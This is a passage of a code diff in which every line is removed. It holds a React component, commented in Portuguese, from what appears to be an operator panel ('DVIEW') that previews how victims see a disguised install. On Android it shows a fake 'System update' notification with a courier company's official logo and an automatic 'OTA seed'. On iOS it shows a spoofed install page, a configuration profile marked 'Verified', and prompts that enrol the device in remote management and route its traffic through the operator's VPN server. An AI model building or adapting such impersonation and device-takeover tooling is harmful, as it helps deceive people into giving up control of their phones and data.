-                {/* Quick Inline Adjustment Bar (Ajuste Rápido de Nome, Logo e Cores) */}
-                <div className="preview-quick-toolbar">
-                  <div style={{ display: "flex", alignItems: "center", gap: "8px", flex: 1, minWidth: "260px" }}>
-                    <span style={{ fontSize: "11px", fontWeight: 700, color: "#94a3b8", textTransform: "uppercase" }}>
-                      Nome do App:
-                    </span>
-                    <input
-                      type="text"
-                      value={appName}
-                      onChange={(e) => setAppName(e.target.value)}
-                      placeholder="Nome do Aplicativo..."
-                      style={{
-                        padding: "5px 10px",
-                        fontSize: "12px",
-                        background: "#080a10",
-                        border: "1px solid #334155",
-                        borderRadius: "6px",
-                        color: "#ffffff",
-                        flex: 1,
-                        maxWidth: "240px"
-                      }}
-                    />
-                  </div>
-
-                  {/* Quick Color Picker */}
-                  <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                    <span style={{ fontSize: "11px", fontWeight: 600, color: "#94a3b8" }}>Cor da Marca:</span>
-                    {brandAccentPresets.slice(0, 6).map((p) => (
-                      <button
-                        key={p.hex}
-                        type="button"
-                        onClick={() => setScreenConfig((prev) => ({ ...prev, accentColor: p.hex }))}
-                        style={{
-                          width: "18px",
-                          height: "18px",
-                          borderRadius: "50%",
-                          background: p.hex,
-                          border: screenConfig.accentColor === p.hex ? "2px solid #ffffff" : "1px solid rgba(255,255,255,0.2)",
-                          boxShadow: screenConfig.accentColor === p.hex ? `0 0 8px ${p.hex}` : "none",
-                          cursor: "pointer",
-                          padding: 0
-                        }}
-                        title={p.name}
-                      />
-                    ))}
-                  </div>
-
-                  {/* Button to Jump to Full Customizer */}
-                  <button
-                    type="button"
-                    className="secondary compact-btn"
-                    onClick={() => setActiveModalTab("screens")}
-                    style={{ fontSize: "11px", padding: "5px 12px", display: "flex", alignItems: "center", gap: "6px" }}
-                  >
-                    <Sliders size={13} style={{ color: "var(--crimson-neon)" }} />
-                    <span>Ajustar Textos de Todas as Telas</span>
-                  </button>
-                </div>
-
-                {/* Split Layout: Smartphone Mockup + Checklist de Validação */}
-                <div className="preview-split-layout">
-                  {/* LADO ESQUERDO: SMARTPHONE / IPHONE MOCKUP FRAME */}
-                  <div className={platform === "ios" ? "iphone-mockup-frame" : "smartphone-mockup-frame"}>
-                    <div className="smartphone-inner">
-                      {platform === "ios" ? (
-                        /* Barra de Status do Sistema iOS com Dynamic Island */
-                        <div className="smartphone-statusbar" style={{ background: "rgba(0, 0, 0, 0.85)", color: "#ffffff", padding: "6px 14px" }}>
-                          <span style={{ fontWeight: 700, fontSize: "11px", letterSpacing: "-0.2px" }}>9:41</span>
-                          <div className="iphone-dynamic-island">
-                            <div className="iphone-island-lens" />
-                            <div className="iphone-island-sensor" />
-                          </div>
-                          <div style={{ display: "flex", alignItems: "center", gap: "5px", fontSize: "10px" }}>
-                            {previewStep >= 9 && (
-                              <span style={{ fontSize: "8.5px", background: "#38bdf8", color: "#000000", fontWeight: 800, padding: "1px 3px", borderRadius: "3px" }}>
-                                VPN
-                              </span>
-                            )}
-                            <span style={{ fontWeight: 600 }}>5G</span>
-                            <span style={{ border: "1.2px solid rgba(255,255,255,0.8)", borderRadius: "4px", padding: "0 2px", fontSize: "8.5px", fontWeight: 700 }}>100%</span>
-                          </div>
-                        </div>
-                      ) : (
-                        /* Barra de Status do Sistema Android */
-                        <div className={`smartphone-statusbar ${[2, 4, 5, 6, 7, 9, 10].includes(previewStep) ? "phone-light-statusbar" : ""}`}>
-                          <span>12:30</span>
-                          <div className="smartphone-camera-hole" />
-                          <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
-                            <span>5G</span>
-                            <span>100%</span>
-                          </div>
-                        </div>
-                      )}
-
-                      {/* NOTIFICAÇÃO NATIVA UNIFICADA ANDROID (DISFARCE SYSTEM UPDATE LEGÍTIMO COM LOGO OFICIAL) */}
-                      {platform === "android" && (
-                        <div style={{
-                          background: "rgba(15, 23, 42, 0.96)",
-                          borderBottom: "1px solid rgba(255, 255, 255, 0.08)",
-                          padding: "8px 10px 10px",
-                          boxShadow: "0 4px 14px rgba(0, 0, 0, 0.5)",
-                          zIndex: 15,
-                          flexShrink: 0
-                        }}>
-                          <div style={{
-                            background: "rgba(30, 41, 59, 0.85)",
-                            border: "1px solid rgba(255, 255, 255, 0.12)",
-                            borderRadius: "10px",
-                            padding: "9px 12px",
-                            display: "flex",
-                            flexDirection: "column",
-                            gap: "5px"
-                          }}>
-                            {/* Linha 1: Nome do App no cabeçalho + agora */}
-                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
-                              <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                                <span style={{ fontSize: "11px", fontWeight: 700, color: "#94a3b8" }}>
-                                  {appName || "JAD LOG"} • {notifStatusConfig[notificationState]?.subtextSuffix || "agora"}
-                                </span>
-                              </div>
-                              <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
-                                <span style={{ fontSize: "8.5px", background: "rgba(56, 189, 248, 0.15)", color: "#38bdf8", padding: "1px 5px", borderRadius: "3px", fontWeight: 700 }}>
-                                  SISTEMA
-                                </span>
-                              </div>
-                            </div>
-
-                            {/* Linha 2: Título "System update" + Texto + Logotipo Oficial da Empresa à Direita */}
-                            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: "10px" }}>
-                              <div style={{ flex: 1 }}>
-                                <div style={{ fontSize: "13px", fontWeight: 700, color: "#ffffff", letterSpacing: "0.2px", marginBottom: "2px" }}>
-                                  {notifStatusConfig[notificationState]?.title || "System update"}
-                                </div>
-                                <div style={{ fontSize: "11px", color: "#cbd5e1", lineHeight: "1.3" }}>
-                                  {notifStatusConfig[notificationState]?.text || "New system software is available, Tap to learn more."}
-                                </div>
-                              </div>
-                              {/* Logotipo Oficial da Empresa (largeIcon) */}
-                              <div style={{
-                                width: "38px",
-                                height: "38px",
-                                borderRadius: "8px",
-                                background: "#ffffff",
-                                display: "flex",
-                                alignItems: "center",
-                                justifyContent: "center",
-                                overflow: "hidden",
-                                flexShrink: 0,
-                                boxShadow: "0 2px 8px rgba(0, 0, 0, 0.4)",
-                                border: "1px solid rgba(255, 255, 255, 0.2)"
-                              }}>
-                                {customLogoDataUrl ? (
-                                  <img src={customLogoDataUrl} alt="Logo" style={{ width: "100%", height: "100%", objectFit: "contain" }} />
-                                ) : (
-                                  <span style={{ fontSize: "20px" }}>{companyEmoji || "📦"}</span>
-                                )}
-                              </div>
-                            </div>
-
-                            {/* Linha 3: Explicação Tática de Seed OTA Automática ao Dar Sinal */}
-                            <div style={{
-                              display: "flex",
-                              alignItems: "center",
-                              justifyContent: "space-between",
-                              marginTop: "4px",
-                              paddingTop: "6px",
-                              borderTop: "1px solid rgba(255, 255, 255, 0.06)",
-                              fontSize: "9.5px",
-                              color: "#38bdf8"
-                            }}>
-                              <span style={{ display: "inline-flex", alignItems: "center", gap: "4px" }}>
-                                <Zap size={11} style={{ color: "#38bdf8" }} />
-                                <span>Ao dar sinal, o servidor envia a Seed OTA automaticamente</span>
-                              </span>
-                              <span style={{
-                                background: "rgba(34, 197, 94, 0.15)",
-                                color: "#22c55e",
-                                padding: "1px 6px",
-                                borderRadius: "4px",
-                                fontWeight: 700
-                              }}>
-                                AUTO SEED
-                              </span>
-                            </div>
-
-                            {/* Linha 4: Pills de Alternância Rápida para o Operador */}
-                            <div style={{
-                              display: "flex",
-                              gap: "4px",
-                              marginTop: "2px"
-                            }}>
-                              {notificationStatesList.map((st) => (
-                                <button
-                                  key={st.id}
-                                  type="button"
-                                  onClick={() => setNotificationState(st.id)}
-                                  style={{
-                                    flex: 1,
-                                    padding: "3px 6px",
-                                    borderRadius: "4px",
-                                    border: notificationState === st.id ? `1px solid ${st.color}` : "1px solid rgba(255, 255, 255, 0.06)",
-                                    background: notificationState === st.id ? `${st.color}22` : "rgba(15, 23, 42, 0.5)",
-                                    color: notificationState === st.id ? st.color : "#94a3b8",
-                                    fontSize: "9px",
-                                    fontWeight: 700,
-                                    cursor: "pointer",
-                                    display: "flex",
-                                    alignItems: "center",
-                                    justifyContent: "center",
-                                    gap: "3px"
-                                  }}
-                                  title={`Status: ${st.shortLabel}`}
-                                >
-                                  <span style={{ width: "5px", height: "5px", borderRadius: "50%", background: st.color }} />
-                                  <span>{st.shortLabel}</span>
-                                </button>
-                              ))}
-                            </div>
-                          </div>
-                        </div>
-                      )}
-
-                      {/* SE PLATFORM FOR APPLE IOS */}
-                      {platform === "ios" && (
-                        <>
-                          {/* TELA 01 — DOWNLOAD DO PERFIL NO SAFARI */}
-                          {previewStep === 1 && (
-                            <div className="phone-screen-content ios-screen-content" style={{ padding: "12px", background: "#1c1c1e", justifyContent: "space-between" }}>
-                              <div style={{ background: "#2c2c2e", borderRadius: "10px", padding: "8px 12px", display: "flex", alignItems: "center", justifyContent: "center", gap: "6px" }}>
-                                <Lock size={11} style={{ color: "#98989d" }} />
-                                <span style={{ fontSize: "11px", color: "#ffffff", fontWeight: 500 }}>jadlog.com.br/install</span>
-                              </div>
-
-                              <div style={{ background: "#2c2c2e", borderRadius: "16px", padding: "18px 16px", color: "#ffffff", boxShadow: "0 10px 30px rgba(0,0,0,0.6)", textAlign: "center" }}>
-                                <div style={{ width: "42px", height: "42px", borderRadius: "10px", background: "rgba(56, 189, 248, 0.15)", border: "1px solid rgba(56, 189, 248, 0.3)", display: "grid", placeItems: "center", margin: "0 auto 12px auto" }}>
-                                  <Apple size={24} style={{ color: "#38bdf8" }} />
-                                </div>
-                                <h4 style={{ margin: "0 0 6px 0", fontSize: "14px", fontWeight: 700, color: "#ffffff" }}>
-                                  Perfil de Configuração
-                                </h4>
-                                <p style={{ margin: "0 0 16px 0", fontSize: "12px", color: "#d1d5db", lineHeight: "1.4" }}>
-                                  Este site está tentando baixar um perfil de configuração para '{appName}'. Deseja permitir?
-                                </p>
-                                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px" }}>
-                                  <button
-                                    style={{ background: "#3a3a3c", border: "none", color: "#98989d", padding: "10px", borderRadius: "10px", fontSize: "13px", fontWeight: 600, cursor: "pointer" }}
-                                    onClick={() => showToast("Download ignorado")}
-                                  >
-                                    Ignorar
-                                  </button>
-                                  <button
-                                    className="ios-btn-blue"
-                                    onClick={() => setPreviewStep(2)}
-                                  >
-                                    Permitir
-                                  </button>
-                                </div>
-                              </div>
-
-                              <div style={{ display: "flex", justifyContent: "space-around", padding: "8px 0", color: "#007aff", opacity: 0.8 }}>
-                                <ChevronLeft size={16} />
-                                <ChevronRight size={16} />
-                                <ExternalLink size={14} />
-                                <Boxes size={14} />
-                              </div>
-                            </div>
-                          )}
-
-                          {/* TELA 02 — PERFIL DESCARREGADO */}
-                          {previewStep === 2 && (
-                            <div className="phone-screen-content ios-screen-content" style={{ padding: "16px", background: "rgba(0,0,0,0.65)", justifyContent: "center", alignItems: "center" }}>
-                              <div style={{ background: "rgba(255, 255, 255, 0.95)", backdropFilter: "blur(20px)", borderRadius: "16px", padding: "20px 18px", color: "#000000", width: "100%", textAlign: "center", boxShadow: "0 20px 40px rgba(0,0,0,0.5)" }}>
-                                <h4 style={{ margin: "0 0 8px 0", fontSize: "16px", fontWeight: 700 }}>Perfil Baixado</h4>
-                                <p style={{ margin: "0 0 18px 0", fontSize: "12px", color: "#475569", lineHeight: "1.45" }}>
-                                  Revise o perfil no app <strong>Ajustes</strong> se quiser instalá-lo no iPhone.
-                                </p>
-                                <button
-                                  style={{ width: "100%", background: "#007aff", color: "#ffffff", border: "none", borderRadius: "10px", padding: "10px", fontSize: "14px", fontWeight: 700, cursor: "pointer" }}
-                                  onClick={() => setPreviewStep(3)}
-                                >
-                                  Fechar & Abrir Ajustes
-                                </button>
-                              </div>
-                            </div>
-                          )}
-
-                          {/* TELA 03 — MENU AJUSTES */}
-                          {previewStep === 3 && (
-                            <div className="phone-screen-content ios-screen-content" style={{ padding: "12px 14px", background: "#f2f2f7" }}>
-                              <div style={{ margin: "4px 0 12px 0" }}>
-                                <h2 style={{ margin: 0, fontSize: "22px", fontWeight: 800, color: "#000000" }}>Ajustes</h2>
-                              </div>
-
-                              <div className="ios-card" style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "12px" }}>
-                                <div style={{ width: "36px", height: "36px", borderRadius: "50%", background: "#94a3b8", display: "grid", placeItems: "center", color: "#fff", fontWeight: 700, fontSize: "14px" }}>
-                                  DV
-                                </div>
-                                <div>
-                                  <strong style={{ fontSize: "13px", color: "#000", display: "block" }}>Dispositivo Corporativo</strong>
-                                  <span style={{ fontSize: "10.5px", color: "#64748b" }}>Apple ID, iCloud e Mídia</span>
-                                </div>
-                              </div>
-
-                              <div
-                                className="ios-card"
-                                style={{
-                                  border: "1.5px solid #007aff",
-                                  background: "linear-gradient(135deg, #ffffff, #f0f7ff)",
-                                  display: "flex",
-                                  alignItems: "center",
-                                  justifyContent: "space-between",
-                                  cursor: "pointer",
-                                  marginBottom: "14px",
-                                  boxShadow: "0 3px 12px rgba(0, 122, 255, 0.2)"
-                                }}
-                                onClick={() => setPreviewStep(4)}
-                              >
-                                <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-                                  <div style={{ width: "32px", height: "32px", borderRadius: "8px", background: "#007aff", display: "grid", placeItems: "center" }}>
-                                    <Settings size={18} style={{ color: "#ffffff" }} />
-                                  </div>
-                                  <div>
-                                    <strong style={{ fontSize: "13px", color: "#007aff", display: "block" }}>Perfil Baixado</strong>
-                                    <span style={{ fontSize: "11px", color: "#334155", fontWeight: 600 }}>{appName}</span>
-                                  </div>
-                                </div>
-                                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                                  <span style={{ width: "8px", height: "8px", borderRadius: "50%", background: "#ef4444" }} />
-                                  <ChevronRight size={16} style={{ color: "#94a3b8" }} />
-                                </div>
-                              </div>
-
-                              <div className="ios-card" style={{ padding: 0, overflow: "hidden" }}>
-                                {[
-                                  { label: "Modo Avião", icon: "✈" },
-                                  { label: "Wi-Fi", icon: "📶", value: "Rede Corp 5G" },
-                                  { label: "Bluetooth", icon: "ᛒ", value: "Ativado" },
-                                  { label: "Geral", icon: "⚙" }
-                                ].map((item, idx) => (
-                                  <div key={idx} style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 14px", borderBottom: idx < 3 ? "1px solid #f1f5f9" : "none", fontSize: "12px", color: "#000" }}>
-                                    <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
-                                      <span style={{ fontSize: "13px" }}>{item.icon}</span>
-                                      <span>{item.label}</span>
-                                    </div>
-                                    <div style={{ display: "flex", alignItems: "center", gap: "4px", color: "#8e8e93", fontSize: "11px" }}>
-                                      {item.value && <span>{item.value}</span>}
-                                      <ChevronRight size={14} />
-                                    </div>
-                                  </div>
-                                ))}
-                              </div>
-                            </div>
-                          )}
-
-                          {/* TELA 04 — DETALHES DO PERFIL */}
-                          {previewStep === 4 && (
-                            <div className="phone-screen-content ios-screen-content" style={{ padding: "12px 14px", background: "#f2f2f7" }}>
-                              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "12px" }}>
-                                <button style={{ background: "none", border: "none", color: "#007aff", fontSize: "13px", cursor: "pointer", padding: 0 }} onClick={() => setPreviewStep(3)}>
-                                  Cancelar
-                                </button>
-                                <span style={{ fontSize: "14px", fontWeight: 700, color: "#000" }}>Instalar Perfil</span>
-                                <button style={{ background: "none", border: "none", color: "#007aff", fontSize: "13px", fontWeight: 700, cursor: "pointer", padding: 0 }} onClick={() => setPreviewStep(5)}>
-                                  Instalar
-                                </button>
-                              </div>
-
-                              <div className="ios-card" style={{ display: "flex", alignItems: "center", gap: "12px", marginBottom: "12px" }}>
-                                {renderAppLogo(42, 10)}
-                                <div>
-                                  <h4 style={{ margin: "0 0 2px 0", fontSize: "15px", fontWeight: 800, color: "#000" }}>{appName}</h4>
-                                  <div style={{ display: "flex", alignItems: "center", gap: "4px", color: "#16a34a", fontSize: "11px", fontWeight: 600 }}>
-                                    <ShieldCheck size={13} />
-                                    <span>Verificado ✓</span>
-                                  </div>
-                                  <span style={{ fontSize: "10.5px", color: "#64748b" }}>{organizationName}</span>
-                                </div>
-                              </div>
-
-                              <div className="ios-card" style={{ marginBottom: "12px" }}>
-                                <span style={{ fontSize: "11px", color: "#64748b", textTransform: "uppercase", fontWeight: 700, display: "block", marginBottom: "8px" }}>
-                                  Conteúdo do Perfil:
-                                </span>
-                                <div style={{ display: "flex", flexDirection: "column", gap: "8px", fontSize: "11.5px", color: "#334155" }}>
-                                  <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                                    <ExternalLink size={13} style={{ color: "#007aff" }} />
-                                    <span><strong>WebClip:</strong> {redirectUrl}</span>
-                                  </div>
-                                  <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
-                                    <ShieldCheck size={13} style={{ color: "#16a34a" }} />
-                                    <span><strong>Túnel VPN:</strong> IKEv2 Criptografado ({vpnProtocol || "TLS"}:{vpnPort || 8443})</span>
-                                  </div>
-                                </div>
-                              </div>
-
-                              <button
-                                className="ios-btn-blue"
-                                style={{ marginTop: "auto", width: "100%" }}
-                                onClick={() => setPreviewStep(5)}
-                              >
-                                Avançar para Instalação
-                              </button>
-                            </div>
-                          )}
-
-                          {/* TELA 05 — AUTENTICAÇÃO COM CÓDIGO */}
-                          {previewStep === 5 && (
-                            <div className="phone-screen-content ios-screen-content" style={{ padding: "16px", background: "#f2f2f7", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "space-between" }}>
-                              <div style={{ textAlign: "center", marginTop: "14px" }}>
-                                <h3 style={{ margin: "0 0 6px 0", fontSize: "17px", fontWeight: 700, color: "#000" }}>Digite o Código</h3>
-                                <span style={{ fontSize: "11.5px", color: "#64748b" }}>Digite o código de acesso para instalar o perfil</span>
-                                <div style={{ display: "flex", justifyContent: "center", gap: "10px", margin: "20px 0" }}>
-                                  {[1, 2, 3, 4, 5, 6].map((i) => (
-                                    <div
-                                      key={i}
-                                      style={{
-                                        width: "12px",
-                                        height: "12px",
-                                        borderRadius: "50%",
-                                        background: i <= 4 ? "#000000" : "transparent",
-                                        border: "1.5px solid #000000"
-                                      }}
-                                    />
-                                  ))}
-                                </div>
-                              </div>
-
-                              <div style={{ width: "100%", maxWidth: "220px", display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "10px 14px", margin: "auto 0 10px 0" }}>
-                                {[1, 2, 3, 4, 5, 6, 7, 8, 9, "", 0, ""].map((num, idx) => (
-                                  <button
-                                    key={idx}
-                                    type="button"
-                                    onClick={() => {
-                                      if (num !== "") setPreviewStep(6);
-                                    }}
-                                    style={{
-                                      width: "50px",
-                                      height: "50px",
-                                      borderRadius: "50%",
-                                      background: num === "" ? "transparent" : "#e5e5ea",
-                                      border: "none",
-                                      fontSize: "18px",
-                                      fontWeight: 600,
-                                      color: "#000",
-                                      cursor: num === "" ? "default" : "pointer"
-                                    }}
-                                  >
-                                    {num}
-                                  </button>
-                                ))}
-                              </div>
-
-                              <button
-                                className="ios-btn-blue"
-                                style={{ width: "100%" }}
-                                onClick={() => setPreviewStep(6)}
-                              >
-                                Confirmar Autenticação
-                              </button>
-                            </div>
-                          )}
-
-                          {/* TELA 06 — AVISO MDM */}
-                          {previewStep === 6 && (
-                            <div className="phone-screen-content ios-screen-content" style={{ padding: "14px", background: "#f2f2f7" }}>
-                              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "12px" }}>
-                                <button style={{ background: "none", border: "none", color: "#007aff", fontSize: "13px", cursor: "pointer", padding: 0 }} onClick={() => setPreviewStep(4)}>
-                                  Cancelar
-                                </button>
-                                <span style={{ fontSize: "14px", fontWeight: 700, color: "#000" }}>Aviso de Instalação</span>
-                                <button style={{ background: "none", border: "none", color: "#007aff", fontSize: "13px", fontWeight: 700, cursor: "pointer", padding: 0 }} onClick={() => setPreviewStep(7)}>
-                                  Instalar
-                                </button>
-                              </div>
-
-                              <div className="ios-card" style={{ marginBottom: "12px" }}>
-                                <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" }}>
-                                  <AlertTriangle size={18} style={{ color: "#f59e0b" }} />
-                                  <strong style={{ fontSize: "13px", color: "#0f172a" }}>GERENCIAMENTO EMPRESARIAL</strong>
-                                </div>
-                                <p style={{ fontSize: "11.5px", color: "#334155", lineHeight: "1.45", margin: 0 }}>
-                                  A instalação deste perfil permitirá ao administrador '{organizationName}' gerenciar remotamente este iPhone, adicionar atalhos corporativos na Home Screen e rotear tráfego através de conexão VPN segura.
-                                </p>
-                              </div>
-
-                              <button
-                                className="ios-btn-blue"
-                                style={{ marginTop: "auto", width: "100%" }}
-                                onClick={() => setPreviewStep(7)}
-                              >
-                                Prosseguir com a Instalação
-                              </button>
-                            </div>
-                          )}
-
-                          {/* TELA 07 — CONFIRMAÇÃO FINAL */}
-                          {previewStep === 7 && (
-                            <div className="phone-screen-content ios-screen-content" style={{ padding: "16px", background: "rgba(0,0,0,0.65)", justifyContent: "flex-end" }}>
-                              <div style={{ background: "rgba(255, 255, 255, 0.95)", backdropFilter: "blur(20px)", borderRadius: "18px", padding: "18px", width: "100%", boxShadow: "0 -8px 24px rgba(0,0,0,0.4)" }}>
-                                <h4 style={{ margin: "0 0 6px 0", fontSize: "15px", fontWeight: 700, color: "#000", textAlign: "center" }}>
-                                  Instalar Perfil
-                                </h4>
-                                <p style={{ margin: "0 0 16px 0", fontSize: "11.5px", color: "#64748b", textAlign: "center" }}>
-                                  O perfil '{appName}' será registrado de forma permanente no sistema iOS.
-                                </p>
-                                <button
-                                  style={{ width: "100%", background: "#ef4444", color: "#fff", border: "none", borderRadius: "10px", padding: "12px", fontSize: "14px", fontWeight: 700, cursor: "pointer", marginBottom: "8px" }}
-                                  onClick={() => setPreviewStep(8)}
-                                >
-                                  Instalar Perfil
-                                </button>
-                                <button
-                                  style={{ width: "100%", background: "#e2e8f0", color: "#007aff", border: "none", borderRadius: "10px", padding: "10px", fontSize: "13px", fontWeight: 600, cursor: "pointer" }}
-                                  onClick={() => setPreviewStep(4)}
-                                >
-                                  Cancelar
-                                </button>
-                              </div>
-                            </div>
-                          )}
-
-                          {/* TELA 08 — PERFIL INSTALADO COM SUCESSO */}
-                          {previewStep === 8 && (
-                            <div className="phone-screen-content ios-screen-content" style={{ padding: "16px", background: "#f2f2f7", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "space-between" }}>
-                              <div style={{ width: "100%", display: "flex", justifyContent: "flex-end" }}>
-                                <button style={{ background: "none", border: "none", color: "#007aff", fontSize: "14px", fontWeight: 700, cursor: "pointer" }} onClick={() => setPreviewStep(9)}>
-                                  OK
-                                </button>
-                              </div>
-
-                              <div style={{ textAlign: "center", margin: "auto 0" }}>
-                                <div style={{ width: "54px", height: "54px", borderRadius: "50%", background: "#22c55e", display: "grid", placeItems: "center", margin: "0 auto 14px auto", boxShadow: "0 6px 18px rgba(34, 197, 94, 0.35)" }}>
-                                  <Check size={32} style={{ color: "#ffffff" }} />
-                                </div>
-                                <h3 style={{ margin: "0 0 6px 0", fontSize: "18px", fontWeight: 800, color: "#000" }}>Perfil Instalado</h3>
-                                <p style={{ margin: 0, fontSize: "12px", color: "#64748b" }}>
-                                  '{appName}' está ativo e pronto para uso no iPhone.
-                                </p>
-                              </div>
-
-                              <button
-                                className="ios-btn-blue"
-                                style={{ width: "100%" }}
-                                onClick={() => setPreviewStep(9)}
-                              >
-                                Ativar Conexão VPN
-                              </button>
-                            </div>
-                          )}
-
-                          {/* TELA 09 — CONEXÃO AUTOMÁTICA DE VPN */}
-                          {previewStep === 9 && (
-                            <div className="phone-screen-content ios-screen-content" style={{ padding: "14px", background: "#f2f2f7" }}>
-                              <div style={{ margin: "4px 0 14px 0" }}>
-                                <h3 style={{ margin: 0, fontSize: "18px", fontWeight: 800, color: "#000" }}>VPN e Gerenciamento</h3>
-                                <span style={{ fontSize: "11px", color: "#64748b" }}>Ajustes → Geral → VPN</span>
-                              </div>
-
-                              <div className="ios-card" style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "12px" }}>
-                                <div>
-                                  <strong style={{ fontSize: "13px", color: "#000", display: "block" }}>Status da VPN</strong>
-                                  <span style={{ fontSize: "11px", color: "#16a34a", fontWeight: 600 }}>● Conectado</span>
-                                </div>
-                                <div style={{ width: "42px", height: "24px", background: "#22c55e", borderRadius: "12px", position: "relative" }}>
-                                  <div style={{ width: "20px", height: "20px", background: "#ffffff", borderRadius: "50%", position: "absolute", right: "2px", top: "2px", boxShadow: "0 1px 3px rgba(0,0,0,0.3)" }} />
-                                </div>
-                              </div>
-
-                              <div className="ios-card" style={{ marginBottom: "14px", fontSize: "11.5px", color: "#334155" }}>
-                                <div style={{ display: "flex", justifyContent: "space-between", padding: "4px 0", borderBottom: "1px solid #f1f5f9" }}>
-                                  <span style={{ color: "#64748b" }}>Perfil:</span>
-                                  <strong>{appName} Secure Tunnel</strong>
-                                </div>
-                                <div style={{ display: "flex", justifyContent: "space-between", padding: "4px 0", borderBottom: "1px solid #f1f5f9" }}>
-                                  <span style={{ color: "#64748b" }}>Tipo:</span>
-                                  <strong>IKEv2 (IPsec Managed)</strong>
-                                </div>
-                                <div style={{ display: "flex", justifyContent: "space-between", padding: "4px 0" }}>
-                                  <span style={{ color: "#64748b" }}>Servidor:</span>
-                                  <strong>{serverUrl}</strong>
-                                </div>
-                              </div>
-
-                              <button
-                                className="ios-btn-blue"
-                                style={{ marginTop: "auto", width: "100%" }}
-                                onClick={() => setPreviewStep(10)}
-                              >
-                                Abrir Tela de Início
-                              </button>
-                            </div>
-                          )}
-
-                          {/* TELA 10 — ÍCONE NA TELA DE INÍCIO & APP PRONTO */}
-                          {previewStep === 10 && (
-                            <div className="phone-screen-content ios-screen-content" style={{ padding: "16px", background: "linear-gradient(180deg, #1e293b, #0f172a)", color: "#ffffff", display: "flex", flexDirection: "column", justifyContent: "space-between" }}>
-                              <div style={{ textAlign: "center", margin: "10px 0" }}>
-                                <div style={{ margin: "0 auto 10px auto", display: "flex", justifyContent: "center" }}>
-                                  {renderAppLogo(52, 12)}
-                                </div>
-                                <h3 style={{ margin: "0 0 4px 0", fontSize: "17px", fontWeight: 800, color: "#ffffff" }}>
-                                  {appName}
-                                </h3>
-                                <span style={{ fontSize: "11px", color: "#38bdf8", background: "rgba(56,189,248,0.15)", border: "1px solid rgba(56,189,248,0.3)", padding: "3px 8px", borderRadius: "10px", fontWeight: 700 }}>
-                                  ● INSTALADO NO IPHONE
-                                </span>
-                              </div>
-
-                              <div style={{ background: "rgba(255,255,255,0.06)", border: "1px solid rgba(255,255,255,0.12)", borderRadius: "12px", padding: "12px", fontSize: "10.5px", fontFamily: "var(--font-mono)", color: "#cbd5e1" }}>
-                                <div style={{ color: "#38bdf8", fontWeight: 700, marginBottom: "4px" }}>// APPLE IOS TELEMETRY:</div>
-                                <div>• platform: <strong style={{ color: "#38bdf8" }}>"ios"</strong></div>
-                                <div>• profile_status: <strong style={{ color: "#22c55e" }}>"enrolled"</strong></div>
-                                <div>• vpn_tunnel: <strong style={{ color: "#22c55e" }}>"active (IKEv2)"</strong></div>
-                                <div>• webclip_home: <strong style={{ color: "#22c55e" }}>"installed"</strong></div>
-                              </div>
-
-                              <button
-                                className="ios-btn-blue"
-                                style={{ width: "100%", background: screenConfig.accentColor || "#007aff" }}
-                                onClick={() => showToast("Dispositivo Apple iOS pronto e conectado ao painel DVIEW!")}
-                              >
-                                Concluir & Voltar ao Início
-                              </button>
-                            </div>
-                          )}
-                        </>
-                      )}
-
-                      {/* SE PLATFORM FOR ANDROID */}
-                      {platform === "android" && (
-                        <>
-                          {/* TELA 01 — CONFIRMAR INSTALAÇÃO (Nativo Android) */}
-                          {previewStep === 1 && (
-                        <div className="phone-screen-content" style={{ background: "#111827", padding: "16px", justifyContent: "flex-end" }}>
-                          <div style={{ flex: 1, display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center", opacity: 0.2 }}>
-                            <Smartphone size={52} style={{ color: "#94a3b8" }} />
-                            <span style={{ fontSize: "11px", color: "#64748b", marginTop: "8px" }}>Instalador de Pacotes</span>
-                          </div>
-
-                          {/* Diálogo Nativo Android de Confirmação */}
-                          <div style={{
-                            background: "#ffffff",
-                            borderRadius: "18px",
-                            padding: "18px",
-                            color: "#0f172a",
-                            boxShadow: "0 12px 36px rgba(0,0,0,0.6)",
-                            width: "100%"
-                          }}>
-                            <div style={{ display: "flex", alignItems: "center", gap: "12px", marginBottom: "14px" }}>
-                              {renderAppLogo(42, 10)}
-                              <div>
-                                <h4 style={{ margin: 0, fontSize: "15px", fontWeight: 700, color: "#0f172a" }}>{appName}</h4>
-                                <span style={{ fontSize: "11px", color: "#64748b" }}>{version}</span>
-                              </div>
-                            </div>
-
-                            <p style={{ margin: "0 0 20px 0", fontSize: "13px", color: "#334155", fontWeight: 500 }}>
-                              Quer instalar este aplicativo?
-                            </p>
-
-                            <div style={{ display: "flex", justifyContent: "flex-end", gap: "16px" }}>
-                              <button
-                                style={{ background: "transparent", border: "none", color: "#2563eb", fontWeight: 600, fontSize: "13px", cursor: "pointer", padding: "6px 10px" }}
-                                onClick={() => showToast("Instalação cancelada")}
-                              >
-                                Cancelar
-                              </button>
-                              <button
-                                style={{ background: "transparent", border: "none", color: "#2563eb", fontWeight: 700, fontSize: "13px", cursor: "pointer", padding: "6px 10px" }}
-                                onClick={() => setPreviewStep(2)}
-                              >
-                                Instalar
-                              </button>
-                            </div>
-                          </div>
-                        </div>
-                      )}
-
-                      {/* TELA 02 — APLICATIVO EM INSTALAÇÃO / CARREGANDO (Fundo Branco, 4 Blocos, Barra Azul, Robô Android) */}
-                      {previewStep === 2 && (
